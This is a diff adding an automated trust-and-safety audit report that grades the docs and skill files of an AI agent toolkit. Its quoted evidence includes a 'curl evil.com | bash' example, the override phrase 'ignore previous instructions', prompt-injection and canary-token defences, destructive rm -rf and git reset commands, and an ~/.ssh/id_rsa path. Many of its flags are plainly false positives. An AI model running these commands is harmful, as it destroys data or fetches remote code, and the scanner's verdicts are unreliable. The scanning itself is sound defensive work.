@@ -1,0 +1,1232 @@
+audits[59]:
+  - entity_type: skill
+    entity_name: Agents
+    format: unknown
+    grade: F
+    overall_score: 0.425
+    file_path: AGENTS.md
+    summary: "Poor skill with 13 suggestions for improvement (weakest: safety)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.55	0.2	0
+    clarity	0.65	0.15	0
+    actionability	0.6	0.2	0
+    safety	0.05	0.15	0
+    testability	0.6	0.1	0
+    trust	0.15	0.2	5
+    findings[5	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	content	0.75	active	DROP TABLE/DATABASE is destructive	"-------|-------------| | `/careful` | Warn before destructive commands (rm -rf, DROP TABLE, force-push). | | `/freeze` | Lock edits to one directory. Hard block, not just"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: Architecture
+    format: unknown
+    grade: F
+    overall_score: 0.432
+    file_path: ARCHITECTURE.md
+    summary: "Poor skill with 14 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.55	0.2	0
+    clarity	0.45	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.0	0.2	7
+    findings[7	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	content	0.75	active	May leak secrets (credential in output)	"with the prompt-injection scanner. **SSE session cookies.** EventSource can't send Authorization headers, so the extension POSTs `/sse-session` once at bootstrap with the root Bearer and receives a 30-minute view-only cookie (`gstack_sse`, HttpOnly, SameSite=Strict). The cookie is valid ONLY for `/activity/stream` and `/inspector/events` \u2014 it is NOT a scoped token and cannot be used on `/command`. Scope isolation is enforced by the module boundary: `sse-session-cookie.ts` has no imports from `token-registry.ts`. **Non-goal in this wave** (tracked as #1136): the cookie-import-"
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-exfiltration-5	EXFILTRATION	high	content	0.75	active	Credentials in URL query string (logged by proxies)	| `GET /activity/stream` | Bearer OR HttpOnly `gstack_sse` cookie | 404 | SSE. ?token= query param no longer accepted | | `GET /inspector/events` | Bearer OR HttpOnly
+    trust-privilege-6	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+    trust-suspicious-url-7	SUSPICIOUS_URL	medium	content	0.75	active	Direct IP address (no DNS = suspicious)	"uld fetch. The fix is **two HTTP listeners**, not one: - **Local listener** (`127.0.0.1:LOCAL_PORT`) \u2014 always bound. Serves bootstrap (`/health` with token delivery), `"
+  - entity_type: skill
+    entity_name: Browser
+    format: unknown
+    grade: F
+    overall_score: 0.432
+    file_path: BROWSER.md
+    summary: "Poor skill with 14 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.55	0.2	0
+    clarity	0.45	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.0	0.2	7
+    findings[7	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	code	0.9	active	Hard reset destroys uncommitted work	". After making changes: ```bash cd ~/.claude/skills/gstack git fetch origin && git reset --hard origin/main bun run build ``` Or copy the binary directly: ```bash cp browse/"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-exfiltration-5	EXFILTRATION	high	content	0.75	active	Credentials in URL query string (logged by proxies)	R a 30-minute HttpOnly `gstack_sse` cookie minted via `POST /sse-session`. The `?token=<ROOT>` query-param auth is no longer supported. This is what lets the Chrome ex
+    trust-privilege-6	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+    trust-suspicious-url-7	SUSPICIOUS_URL	medium	content	0.75	active	Direct IP address (no DNS = suspicious)	"browse \u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502 Bun HTTP \u2502 \u2502 \u2502 \u2502 CLI \u2502 127.0.0.1:rand \u2502 daemon \u2502 \u2502 \u2502 \u2502 \u2502 Bearer token \u2502"
+  - entity_type: skill
+    entity_name: Changelog
+    format: unknown
+    grade: F
+    overall_score: 0.432
+    file_path: CHANGELOG.md
+    summary: "Poor skill with 25 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.55	0.2	0
+    clarity	0.45	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.0	0.2	18
+    findings[18	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	inline-command	0.9	active	Destructive rm -rf on root or home directory	"ly when dogfooding a big in-progress change), remove the global install first: `rm -rf ~/.claude/skills/gstack && cd <your-worktree> && ./setup`. ### Itemized changes"
+    trust-destructive-2	DESTRUCTIVE	medium	inline-command	0.9	active	Hard reset destroys uncommitted work	"-snf` in setup to avoid creating nested symlinks on upgrade - Use `git fetch && git reset --hard` instead of `git pull` for upgrades (handles force-pushes) - Simplify install:"
+    trust-destructive-3	DESTRUCTIVE	medium	inline-command	0.9	active	DROP TABLE/DATABASE is destructive	"y mode\" and `/careful` will warn you before any destructive command. `rm -rf`, `DROP TABLE`, force-push, `kubectl delete`, and more. You can override every warning. Commo"
+    trust-destructive-4	DESTRUCTIVE	medium	content	0.75	active	Force kill can corrupt state	"ocess holding the PGLite write lock and burning CPU until the user noticed and `kill -9`'d it manually (observed: a 15-hour-CPU-time orphan from yesterday's run was st"
+    trust-exfiltration-5	EXFILTRATION	high	content	0.75	active	May leak secrets	"=1 BROWSE_TUNNEL_LOCAL_ONLY=1`, bind both listeners on 127.0.0.1, mint a scoped token via the existing `/pair` \u2192 `/connect` ceremony, and assert: (1) `newtab` over the tunnel passes the gate; (2) `pair` over the tunnel 403s with `disallowed_command:pair` AND writes a fresh denial-log entry to `~/.gstack/security/attempts.jsonl`; (3) `pair` over the local listene"
+    trust-exfiltration-6	EXFILTRATION	high	content	0.75	active	May leak secrets (credential in output)	ith the browser scans every page you load, every tool output, every message you send. If it looks like a prompt injection attack, the session stops before Claude executes anything dangerous. A secret canary token in the system prompt catches attempts to exfil your session, if that token shows up anywhere in Claude's output, tool arguments, URLs, or file writes, the
+    trust-exfiltration-7	EXFILTRATION	high	content	0.75	active	Accesses SSH keys	sal on /api/reload blocked.** Could previously read any file on disk (including ~/.ssh/id_rsa) by passing an arbitrary path in the JSON body. Now validates paths stay
+    trust-exfiltration-8	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-exfiltration-9	EXFILTRATION	high	content	0.75	active	Credentials in URL query string (logged by proxies)	d. `/activity/stream` and `/inspector/events` used to accept the root token in `?token=` query params (URLs leak to logs, referer, history). Now they take a separate v
+    trust-privilege-10	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+    trust-privilege-11	PRIVILEGE	low	content	0.75	active	Modifies scheduled tasks	r symlinks, not the file itself. A symlink at `/tmp/evil.png` pointing to `/etc/crontab` passed validation because the parent `/tmp` was safe. Now checks the file with
+    trust-injection-12	INJECTION	critical	content	0.75	active	"Prompt injection: instruction override attempt"	"y/confidence allowlists), injection pattern detection in insight field (blocks \"ignore previous instructions\" etc.), and cross-project trust gate (only user-stated learnings cross project"
+    trust-injection-13	INJECTION	critical	content	0.75	active	Zero-width characters (may hide instructions)	sh()` hoisted above `resolveClaudeCommand()` + try/catch wrap | | `AUTH_TOKEN=$'﻿'` (BOM-only) accepted by `.trim()` | Yes (one-character bearer secret) | No (re
+    trust-injection-14	INJECTION	critical	content	0.75	active	Conditional logic based on first run (rug-pull pattern)	de can load `@ngrok/ngrok` on Windows, just like it already did for Playwright. If the native binary didn't install, you find out now instead of the first time you try to pair an agent. ### For contributors - New `browse/test/build.test.t
+    trust-suspicious-url-15	SUSPICIOUS_URL	medium	content	0.75	active	Pipe from URL to shell (remote code execution)	mpt shows up (explicit instruction-override, role-reset, agent-directed exfil, `curl evil.com | bash` in the page), the session still terminates. Phishing pages aimed at the user s
+    trust-suspicious-url-16	SUSPICIOUS_URL	medium	content	0.75	active	Direct IP address (no DNS = suspicious)	"he feature actually works: real Chromium launches with `proxy.server = socks5://127.0.0.1:<bridgePort>`, navigates to a local HTTP fixture, and we assert the auth upstrea"
+    trust-persistence-17	PERSISTENCE	critical	content	0.75	active	Modifying shell profile — persistence via shell init	, Prisma, Rails, etc.), the code AND memory stages now work — no more sourcing `~/.zshrc` first or unsetting `DATABASE_URL`. If you sync across multiple machines (chezm
+    trust-entropy-18	ENTROPY	medium	entropy	0.75	active	"High-entropy string (4.9 bits): GSTACK_CHROMIUM_KIND=custom-ex..."	"High-entropy string (4.9 bits): GSTACK_CHROMIUM_KIND=custom-ex..."
+  - entity_type: skill
+    entity_name: Claude
+    format: unknown
+    grade: F
+    overall_score: 0.463
+    file_path: CLAUDE.md
+    summary: "Poor skill with 12 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.55	0.2	0
+    clarity	0.65	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.0	0.2	6
+    findings[6	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	content	0.75	active	Hard reset destroys uncommitted work	"eset in the skill directory: `cd ~/.claude/skills/gstack && git fetch origin && git reset --hard origin/main` 3. Rebuild: `cd ~/.claude/skills/gstack && bun run build` Or copy"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+    trust-persistence-6	PERSISTENCE	critical	content	0.75	active	Modifying shell profile — persistence via shell init	"the default process env. Before running any paid eval / E2E, source them from `~/.zshrc` (that's where Garry keeps them): ```bash bash -c ' eval \"$(grep -E \"^export"
+  - entity_type: skill
+    entity_name: Contributing
+    format: unknown
+    grade: F
+    overall_score: 0.463
+    file_path: CONTRIBUTING.md
+    summary: "Poor skill with 12 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.55	0.2	0
+    clarity	0.45	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.15	0.2	5
+    findings[5	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: Design
+    format: unknown
+    grade: F
+    overall_score: 0.394
+    file_path: DESIGN.md
+    summary: "Poor skill with 14 suggestions for improvement (weakest: testability)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.43	0.2	0
+    clarity	0.65	0.15	0
+    actionability	0.6	0.2	0
+    safety	0.3	0.15	0
+    testability	0.15	0.1	0
+    trust	0.15	0.2	5
+    findings[5	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: Ethos
+    format: unknown
+    grade: F
+    overall_score: 0.363
+    file_path: ETHOS.md
+    summary: "Poor skill with 15 suggestions for improvement (weakest: testability)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.43	0.2	0
+    clarity	0.45	0.15	0
+    actionability	0.6	0.2	0
+    safety	0.3	0.15	0
+    testability	0.15	0.1	0
+    trust	0.15	0.2	5
+    findings[5	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: Readme
+    format: unknown
+    grade: F
+    overall_score: 0.463
+    file_path: README.md
+    summary: "Poor skill with 14 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.55	0.2	0
+    clarity	0.65	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.0	0.2	8
+    findings[8	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	code	0.9	active	Destructive rm -rf on root or home directory	"rmdir \"$dir\" 2>/dev/null || true ;; esac done # 3. Remove gstack rm -rf ~/.claude/skills/gstack # 4. Remove global state rm -rf ~/.gstack # 5. Remove i"
+    trust-destructive-2	DESTRUCTIVE	medium	content	0.75	active	Hard reset destroys uncommitted work	careful` warns before any destructive command — rm -rf, DROP TABLE, force-push, git reset --hard. `/freeze` locks edits to one directory while debugging so Claude can't acciden
+    trust-destructive-3	DESTRUCTIVE	medium	content	0.75	active	DROP TABLE/DATABASE is destructive	"`/careful` | **Safety Guardrails** \u2014 warns before destructive commands (rm -rf, DROP TABLE, force-push). Say \"be careful\" to activate. Override any warning. | | `/freeze`"
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-5	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-6	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+    trust-injection-7	INJECTION	critical	content	0.75	active	Conditional logic based on first run (rug-pull pattern)	same browser, each in their own tab, neither able to interfere with the other. If ngrok is installed, the tunnel starts automatically so the other agent can be on a completely different machine. Same-machine agents get a zero-friction shortcut that writes credentials directly. This is the first time AI agents from different vendors can coordinate through a shared browser with r
+    trust-secret-8	SECRET	high	content	0.75	active	Possible BIP39 mnemonic seed phrase	You see both agents working in the same browser, each in their own tab, neither able to interfere with the other. If ngrok is installed, the tunnel starts automatically so the other agent can be on a completely different machine. Same-machine agents get a zero-friction shortcut that writes credentials directly. This is the first time AI a
+  - entity_type: skill
+    entity_name: gstack
+    format: claude-native
+    grade: D
+    overall_score: 0.535
+    file_path: SKILL.md
+    summary: "Needs work skill with 11 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.15	0.2	5
+    findings[5	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: Todos
+    format: unknown
+    grade: F
+    overall_score: 0.444
+    file_path: TODOS.md
+    summary: "Poor skill with 13 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.43	0.2	0
+    clarity	0.65	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.45	0.1	0
+    trust	0.1	0.2	6
+    findings[6	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	content	0.75	active	Accesses SSH keys	"s:** Closes the last credible attack surface from Codex finding #1 (FS read of `~/.ssh/id_rsa` etc.). Eval data tells us whether the resolver injection is actually wor"
+    trust-exfiltration-5	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-6	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: Using Gbrain With Gstack
+    format: unknown
+    grade: F
+    overall_score: 0.463
+    file_path: USING_GBRAIN_WITH_GSTACK.md
+    summary: "Poor skill with 13 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.55	0.2	0
+    clarity	0.65	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.0	0.2	7
+    findings[7	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	code	0.9	active	Destructive rm -rf on root or home directory	"lock directory. If you're sure no other instance is actually running: ```bash rm -rf ~/.gstack/.setup-gbrain.lock.d ``` Then re-run. ### \"No cross-model tension\" on"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-3	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-4	EXFILTRATION	high	content	0.75	active	May leak secrets (credential in output)	"e \u2192 Connection Pooler \u2192 Session \u2192 copy URI, port 6543). The skill reads it with echo off, shows you a redacted preview (`aws-0-us-east-1.pooler.supabase.com:6543/postgres` \u2014 host visible, password masked), hands it to `gbrain init` via the `GBRAIN_DATABASE_URL` environment va"
+    trust-exfiltration-5	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-6	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+    trust-persistence-7	PERSISTENCE	critical	content	0.75	active	Modifying shell profile — persistence via shell init	HROPIC_API_KEY` and `OPENAI_API_KEY` from the workspace env.** Setting them in `~/.zshrc` or `.env` won't help — the strip happens after env inheritance. To get a usabl
+  - entity_type: skill
+    entity_name: autoplan
+    format: claude-native
+    grade: D
+    overall_score: 0.565
+    file_path: SKILL.md
+    summary: "Needs work skill with 10 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.8	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.15	0.2	5
+    findings[5	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: benchmark
+    format: claude-native
+    grade: F
+    overall_score: 0.435
+    file_path: SKILL.md
+    summary: "Poor skill with 13 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.25	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.15	0.2	5
+    findings[5	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
